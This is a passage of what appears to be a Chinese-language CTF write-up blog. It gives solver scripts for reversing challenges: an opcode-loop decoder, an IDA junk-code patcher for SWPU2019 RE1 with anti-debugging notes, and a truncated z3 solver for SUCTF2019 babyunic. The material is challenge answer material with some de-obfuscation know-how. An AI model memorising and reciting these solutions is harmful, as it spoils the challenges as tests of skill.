class="line">        res=~a[cnt+<span class="number">1</span>]</span><br><span class="line">        cnt+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">2</span>:</span><br><span class="line">        res=a[cnt+<span class="number">1</span>]^a[cnt+<span class="number">2</span>]</span><br><span class="line">        cnt+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">3</span>:</span><br><span class="line">        res=a[cnt+<span class="number">1</span>]&amp;a[cnt+<span class="number">2</span>]</span><br><span class="line">        cnt+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">4</span>:</span><br><span class="line">        res=a[cnt+<span class="number">1</span>]|a[cnt+<span class="number">2</span>]</span><br><span class="line">        cnt+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">5</span>:</span><br><span class="line">        res=a[cnt+<span class="number">1</span>]+a[cnt+<span class="number">2</span>]</span><br><span class="line">        cnt+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">6</span>:</span><br><span class="line">        res=a[cnt+<span class="number">2</span>]-a[cnt+<span class="number">1</span>]</span><br><span class="line">        cnt+=<span class="number">3</span></span><br><span class="line">    res+=<span class="number">0x100</span></span><br><span class="line">    res&amp;=<span class="number">0xff</span></span><br><span class="line">    flag+=chr(res)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="rev-SWPU2019-RE1"><a href="#rev-SWPU2019-RE1" class="headerlink" title="[rev][SWPU2019]RE1"></a>[rev][SWPU2019]RE1</h2><p>sub_4059e0，猜测是父子进程调试</p>
<p>流程大概是父进程创建子进程，然后创建线程不断给子进程发信号15，直到子进程退出</p>
<p>调试的时候程序CreateWindowExA会异常停止，不调试没问题。</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194640#h3-11">https://www.anquanke.com/post/id/194640#h3-11</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/96698636">https://zhuanlan.zhihu.com/p/96698636</a></p>
<p>sub_401c50，sub_401470都是反调试</p>
<p>去花脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#end = 0x44F3C0</span></span><br><span class="line">end = <span class="number">0x405758</span></span><br><span class="line">start = <span class="number">0x405060</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">    now = get_bytes(i,<span class="number">3</span>)</span><br><span class="line">    far = get_bytes(i+<span class="number">0x75</span><span class="number">-0x6f</span>+<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> now==<span class="string">&#x27;\x83\xec\x04&#x27;</span> <span class="keyword">and</span> far==<span class="string">&#x27;\x60\x0f\xfb\x7f&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,i+<span class="number">0x9f</span><span class="number">-0x6f</span>):</span><br><span class="line">            patch_byte(j,<span class="number">0x90</span>)</span><br><span class="line">        print(<span class="string">&#x27;patched %x&#x27;</span>%i)</span><br></pre></td></tr></table></figure>

<p>需要先过反调试</p>
<p>可以通过CE搜索字符串找到基址，然后IDA交叉引用找到关键代码</p>
<p>TODO</p>
<h2 id="Crypto-密码学的心声"><a href="#Crypto-密码学的心声" class="headerlink" title="[Crypto]密码学的心声"></a>[Crypto]密码学的心声</h2><p>八进制，已经提示没有8了= =</p>
<h2 id="rev-SUCTF2019-babyunic"><a href="#rev-SUCTF2019-babyunic" class="headerlink" title="[rev]SUCTF2019]babyunic"></a>[rev]SUCTF2019]babyunic</h2><p>搜索un_open发现是unicorn-engine</p>
<p>流程大概是打开func文件，然后以mips 大端模式执行代码</p>
<p>使用ghidra可以反编译代码</p>
<p>关于架构和模式信息，可以查看unicorn/unicorn.h</p>
<p>参考: <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1039478-1-1.html#28221000_babyunic">https://www.52pojie.cn/thread-1039478-1-1.html#28221000_babyunic</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># param_1 = [BitVec(&quot;param_1%d&quot;%i,32) for i in range(0x2a)]</span></span><br><span class="line"><span class="comment"># 由于BitVec要考虑溢出的问题，所以速度要慢好多</span></span><br><span class="line">param_1 = [Int(<span class="string">&#x27;p%d&#x27;</span>%i)<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2a</span>)]</span><br><span class="line"></span><br><span class="line">param_2 = [<span class="number">0x94ffffff</span>, <span class="number">0x38ffffff</span>, <span class="number">0x26010000</span>, <span class="number">0x28ffffff</span>, <span class="number">0x10fcffff</span>, <span class="number">0x94020000</span>, <span class="number">0x9efcffff</span>, <span class="number">0xea060000</span>, <span class="number">0xdc000000</span>, <span class="number">0x6000000</span>, <span class="number">0xcffffff</span>, <span class="number">0xf6fdffff</span>, <span class="number">0x82faffff</span>, <span class="number">0xd0fcffff</span>, <span class="number">0x82010000</span>, <span class="number">0xde030000</span>, <span class="number">0x4e010000</span>, <span class="number">0xb2020000</span>, <span class="number">0xd8f8ffff</span>, <span class="number">0x74010000</span>, <span class="number">0xa6faffff</span>, <span class="number">0xd4f9ffff</span>, <span class="number">0xc2010000</span>, <span class="number">0x7cf9ffff</span>, <span class="number">0x5a030000</span>, <span class="number">0x46010000</span>, <span class="number">0x3cffffff</span>, <span class="number">0x14faffff</span>, <span class="number">0xce010000</span>, <span class="number">0xdc070000</span>, <span class="number">0x48fdffff</span>, <span class="number">0x98000000</span>, <span class="number">0x5e080000</span>, <span class="number">0xb0fdffff</span>, <span class="number">0xbcffffff</span>, <span class="number">0x6e030000</span>, <span class="number">0x4effffff</span>, <span class="number">0x36f8ffff</span>, <span class="number">0xc0050000</span>, <span class="number">0xae060000</span>, <span class="number">0x94060000</span>, <span class="number">0x22000000</span>]</span><br><span class="line"><span class="comment"># 此处注意大小端转化</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(param_2)):</span><br><span class="line">    t = param_2[i]</span><br><span class="line">    param_2[i] = ((t&amp;<span class="number">0xff</span>)&lt;&lt;<span class="number">24</span>)|((t&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((t&lt;&lt;<span class="number">8</span>)&amp;<span class="number">0x00ff0000</span>)|((t&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff00</span>)</span><br><span class="line">    <span class="keyword">if</span> param_2[i]&gt;=<span class="number">0x80000000</span>:</span><br><span class="line">        param_2[i]-=<span class="number">0x100000000</span></span><br><span class="line">    param_2[i] = IntVal(param_2[i])</span><br><span class="line">print()</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> param_1:</span><br><span class="line">    s.add(i&gt;=<span class="number">0</span>)</span><br><span class="line">    s.add(i&lt;=<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">s.add(param_2[<span class="number">0</span>] == (((((((((((((((((((((((((((((((param_1[<span class="number">0</span>] + param_1[<span class="number">1</span>] + param_1[<span class="number">2</span>]) -</span><br><span class="line">                                          param_1[<span class="number">3</span>]) + param_1[<span class="number">4</span>]) - param_1[<span class="number">5</span>])</span><br><span class="line">                                       - param_1[<span class="number">6</span>]) - param_1[<span class="number">7</span>]) - param_1[<span class="number">8</span>]) +</span><br><span class="line">                                     param_1[<span class="number">9</span>] + param_1[<span class="number">10</span>]) - param_1[<span class="number">0xb</span>]) +</span><br><span class="line">                                  param_1[<span class="number">0xc</span>]) - param_1[<span class="number">0xd</span>]) - param_1[<span class="number">0xe</span>]) +</span><br><span class="line">                               param_1[<span class="number">0xf</span>]) - param_1[<span class="number">0x10</span>]) - param_1[<span class="number">0x11</span>]) +</span><br><span class="line">                             param_1[<span class="number">0x12</span>] + param_1[<span class="number">0x13</span>]) - param_1[<span class="number">0x14</span>]) +</span><br><span class="line">                           param_1[<span class="number">0x15</span>] + param_1[<span class="number">0x16</span>] + param_1[<span class="number">0x17</span>] +</span><br><span class="line">                          param_1[<span class="number">0x18</span>]) - param_1[<span class="number">0x19</span>]) + param_1[<span class="number">0x1a</span>]) -</span><br><span class="line">                       param_1[<span class="number">0x1b</span>]) + param_1[<span class="number">0x1c</span>] + param_1[<span class="number">0x1d</span>]) -</span><br><span class="line">                     param_1[<span class="number">0x1e</span>]) - param_1[<span class="number">0x1f</span>]) + param_1[<span class="number">0x20</span>]) -</span><br><span class="line">                  param_1[<span class="number">0x21</span>]) + param_1[<span class="number">0x22</span>] + param_1[<span class="number">0x23</span>]) -</span><br><span class="line">                param_1[<span class="number">0x24</span>]) - param_1[<span class="number">0x25</span>]) + param_1[<span class="number">0x26</span>]) -</span><br><span class="line">             param_1[<span class="number">0x27</span>]) + param_1[<span class="number">0x28</span>] + param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">1</span>] == ((((((((((((((((((((((((((((((((((param_1[<span class="number">0</span>] - param_1[<span class="number">1</span>]) +</span><br><span class="line">                                               param_1[<span class="number">2</span>]) - param_1[<span class="number">3</span>]) -</span><br><span class="line">                                             param_1[<span class="number">4</span>]) + param_1[<span class="number">5</span>]) -</span><br><span class="line">                                           param_1[<span class="number">6</span>]) - param_1[<span class="number">7</span>]) - param_1[<span class="number">8</span>])</span><br><span class="line">                                        - param_1[<span class="number">9</span>]) + param_1[<span class="number">10</span>]) -</span><br><span class="line">                                      param_1[<span class="number">0xb</span>]) + param_1[<span class="number">0xc</span>]) - param_1[<span class="number">0xd</span>]</span><br><span class="line">                                    ) - param_1[<span class="number">0xe</span>]) + param_1[<span class="number">0xf</span>]) -</span><br><span class="line">                                 param_1[<span class="number">0x10</span>]) - param_1[<span class="number">0x11</span>]) + param_1[<span class="number">0x12</span>])</span><br><span class="line">                              - param_1[<span class="number">0x13</span>]) + param_1[<span class="number">0x14</span>] + param_1[<span class="number">0x15</span>]) -</span><br><span class="line">                            param_1[<span class="number">0x16</span>]) - param_1[<span class="number">0x17</span>]) - param_1[<span class="number">0x18</span>]) +</span><br><span class="line">                         param_1[<span class="number">0x19</span>]) - param_1[<span class="number">0x1a</span>]) + param_1[<span class="number">0x1b</span>]) -</span><br><span class="line">                      param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) + param_1[<span class="number">0x1e</span>] +</span><br><span class="line">                     param_1[<span class="number">0x1f</span>] + param_1[<span class="number">0x20</span>] + param_1[<span class="number">0x21</span>] +</span><br><span class="line">                     param_1[<span class="number">0x22</span>] + param_1[<span class="number">0x23</span>]) - param_1[<span class="number">0x24</span>]) -</span><br><span class="line">                  param_1[<span class="number">0x25</span>]) - param_1[<span class="number">0x26</span>]) - param_1[<span class="number">0x27</span>]) -</span><br><span class="line">               param_1[<span class="number">0x28</span>]) + param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">2</span>] == (((((((((((((((((((((((((((((param_1[<span class="number">0</span>] - param_1[<span class="number">1</span>]) + param_1[<span class="number">2</span>] +</span><br><span class="line">                                          param_1[<span class="number">3</span>]) - param_1[<span class="number">4</span>]) + param_1[<span class="number">5</span>])</span><br><span class="line">                                       - param_1[<span class="number">6</span>]) - param_1[<span class="number">7</span>]) + param_1[<span class="number">8</span>]) -</span><br><span class="line">                                    param_1[<span class="number">9</span>]) - param_1[<span class="number">10</span>]) - param_1[<span class="number">0xb</span>]) -</span><br><span class="line">                                 param_1[<span class="number">0xc</span>]) - param_1[<span class="number">0xd</span>]) + param_1[<span class="number">0xe</span>]) -</span><br><span class="line">                              param_1[<span class="number">0xf</span>]) - param_1[<span class="number">0x10</span>]) + param_1[<span class="number">0x11</span>] +</span><br><span class="line">                             param_1[<span class="number">0x12</span>] + param_1[<span class="number">0x13</span>] + param_1[<span class="number">0x14</span>] +</span><br><span class="line">                            param_1[<span class="number">0x15</span>]) - param_1[<span class="number">0x16</span>]) + param_1[<span class="number">0x17</span>] +</span><br><span class="line">                           param_1[<span class="number">0x18</span>] + param_1[<span class="number">0x19</span>] + param_1[<span class="number">0x1a</span>]) -</span><br><span class="line">                         param_1[<span class="number">0x1b</span>]) + param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) +</span><br><span class="line">                      param_1[<span class="number">0x1e</span>]) - param_1[<span class="number">0x1f</span>]) + param_1[<span class="number">0x20</span>] +</span><br><span class="line">                    param_1[<span class="number">0x21</span>]) - param_1[<span class="number">0x22</span>]) - param_1[<span class="number">0x23</span>]) +</span><br><span class="line">                  param_1[<span class="number">0x24</span>] + param_1[<span class="number">0x25</span>] + param_1[<span class="number">0x26</span>]) -</span><br><span class="line">                param_1[<span class="number">0x27</span>]) + param_1[<span class="number">0x28</span>]) - param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">3</span>] == (((((((((((((((((((((((((((((((param_1[<span class="number">0</span>] - param_1[<span class="number">1</span>]) - param_1[<span class="number">2</span>])</span><br><span class="line">                                           - param_1[<span class="number">3</span>]) - param_1[<span class="number">4</span>]) -</span><br><span class="line">                                         param_1[<span class="number">5</span>]) + param_1[<span class="number">6</span>] + param_1[<span class="number">7</span>]) -</span><br><span class="line">                                       param_1[<span class="number">8</span>]) - param_1[<span class="number">9</span>]) - param_1[<span class="number">10</span>]) -</span><br><span class="line">                                    param_1[<span class="number">0xb</span>]) + param_1[<span class="number">0xc</span>]) - param_1[<span class="number">0xd</span>])</span><br><span class="line">                                 + param_1[<span class="number">0xe</span>]) - param_1[<span class="number">0xf</span>]) + param_1[<span class="number">0x10</span>])</span><br><span class="line">                              - param_1[<span class="number">0x11</span>]) + param_1[<span class="number">0x12</span>] + param_1[<span class="number">0x13</span>] +</span><br><span class="line">                             param_1[<span class="number">0x14</span>]) - param_1[<span class="number">0x15</span>]) + param_1[<span class="number">0x16</span>] +</span><br><span class="line">                            param_1[<span class="number">0x17</span>] + param_1[<span class="number">0x18</span>]) - param_1[<span class="number">0x19</span>]) -</span><br><span class="line">                         param_1[<span class="number">0x1a</span>]) + param_1[<span class="number">0x1b</span>]) - param_1[<span class="number">0x1c</span>]) +</span><br><span class="line">                       param_1[<span class="number">0x1d</span>] + param_1[<span class="number">0x1e</span>]) - param_1[<span class="number">0x1f</span>]) -</span><br><span class="line">                    param_1[<span class="number">0x20</span>]) - param_1[<span class="number">0x21</span>]) + param_1[<span class="number">0x22</span>]) -</span><br><span class="line">                 param_1[<span class="number">0x23</span>]) + param_1[<span class="number">0x24</span>] + param_1[<span class="number">0x25</span>] +</span><br><span class="line">                param_1[<span class="number">0x26</span>]) - param_1[<span class="number">0x27</span>]) + param_1[<span class="number">0x28</span>] +</span><br><span class="line">               param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span 